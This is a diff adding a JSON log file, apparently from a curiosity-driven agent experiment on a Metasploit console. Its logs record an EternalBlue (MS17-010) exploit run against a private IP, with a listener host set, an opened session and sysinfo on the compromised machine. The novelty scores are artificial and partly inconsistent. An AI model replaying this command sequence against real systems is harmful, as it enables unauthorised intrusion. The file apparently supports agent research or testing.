@@ -1,0 +1,98 @@
+{
+  "novelty_counts": {
+    "state1": 1,
+    "state2": 2,
+    "state3": 3,
+    "state4": 4,
+    "state5": 5,
+    "state6": 6,
+    "state7": 7,
+    "state8": 8,
+    "state9": 9,
+    "state10": 10,
+    "state11": 11,
+    "state12": 12,
+    "state13": 13,
+    "state14": 14,
+    "state15": 15
+  },
+  "learning_log": [
+    {
+      "timestamp": "2025-04-19T10:00:00",
+      "command": "help",
+      "novelty_score": 1.0,
+      "success": true
+    },
+    {
+      "timestamp": "2025-04-19T10:01:00",
+      "command": "version",
+      "novelty_score": 0.9,
+      "success": true
+    },
+    {
+      "timestamp": "2025-04-19T10:02:00",
+      "command": "use exploit/windows/smb/ms17_010_eternalblue",
+      "novelty_score": 0.8,
+      "success": true
+    },
+    {
+      "timestamp": "2025-04-19T10:03:00",
+      "command": "show options",
+      "novelty_score": 0.7,
+      "success": true
+    },
+    {
+      "timestamp": "2025-04-19T10:04:00",
+      "command": "set RHOSTS 192.168.1.100",
+      "novelty_score": 0.6,
+      "success": true
+    },
+    {
+      "timestamp": "2025-04-19T10:05:00",
+      "command": "exploit",
+      "novelty_score": 0.5,
+      "success": false
+    },
+    {
+      "timestamp": "2025-04-19T10:06:00",
+      "command": "set LHOST 192.168.1.10",
+      "novelty_score": 0.4,
+      "success": true
+    },
+    {
+      "timestamp": "2025-04-19T10:07:00",
+      "command": "exploit",
+      "novelty_score": 0.3,
+      "success": true
+    },
+    {
+      "timestamp": "2025-04-19T10:08:00",
+      "command": "sessions -i 1",
+      "novelty_score": 0.2,
+      "success": true
+    },
+    {
+      "timestamp": "2025-04-19T10:09:00",
+      "command": "sysinfo",
+      "novelty_score": 0.1,
+      "success": true
+    }
+  ],
+  "curiosity_log": [
+    "[2025-04-19 10:00:00] Command 'help' resulted in state 'state1' with novelty score: 1.0000",
+    "[2025-04-19 10:01:00] Command 'version' resulted in state 'state2' with novelty score: 0.7071",
+    "[2025-04-19 10:02:00] Command 'use exploit/windows/smb/ms17_010_eternalblue' resulted in state 'state3' with novelty score: 0.5774",
+    "[2025-04-19 10:03:00] Command 'show options' resulted in state 'state4' with novelty score: 0.5000",
+    "[2025-04-19 10:04:00] Command 'set RHOSTS 192.168.1.100' resulted in state 'state5' with novelty score: 0.4472",
+    "[2025-04-19 10:05:00] Command 'exploit' resulted in state 'state6' with novelty score: 0.4082 (ERROR)",
+    "[2025-04-19 10:06:00] Command 'set LHOST 192.168.1.10' resulted in state 'state7' with novelty score: 0.3780",
+    "[2025-04-19 10:07:00] Command 'exploit' resulted in state 'state8' with novelty score: 0.3536",
+    "[2025-04-19 10:08:00] Command 'sessions -i 1' resulted in state 'state9' with novelty score: 0.3333",
+    "[2025-04-19 10:09:00] Command 'sysinfo' resulted in state 'state10' with novelty score: 0.3162",
+    "[2025-04-19 10:10:00] Command 'help' resulted in state 'state1' with novelty score: 0.7071 (REPEAT)",
+    "[2025-04-19 10:11:00] Command 'version' resulted in state 'state2' with novelty score: 0.5774 (REPEAT)",
+    "[2025-04-19 10:12:00] Command 'use exploit/windows/smb/ms17_010_eternalblue' resulted in state 'state3' with novelty score: 0.5000 (REPEAT)",
+    "[2025-04-19 10:13:00] Command 'show options' resulted in state 'state4' with novelty score: 0.4472 (REPEAT)",
+    "[2025-04-19 10:14:00] Command 'set RHOSTS 192.168.1.100' resulted in state 'state5' with novelty score: 0.4082 (REPEAT)"
+  ]
+}
